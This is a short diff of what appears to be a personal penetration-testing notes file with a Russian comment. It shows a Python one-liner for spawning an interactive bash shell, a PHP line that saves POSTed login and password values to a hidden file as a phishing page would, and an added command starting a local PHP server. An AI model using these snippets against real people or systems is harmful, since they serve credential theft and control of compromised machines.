@@ -17,3 +17,7 @@ python -c 'import pty;pty.spawn('/bin/bash')'
 # Запись в файл переменных
 
 file_put_contents(".max", $_POST['log'] . ":" . $_POST['pwd'] . "\n" , FILE_APPEND);
+
+#PHP server
+
+php -S 127.0.0.1:80
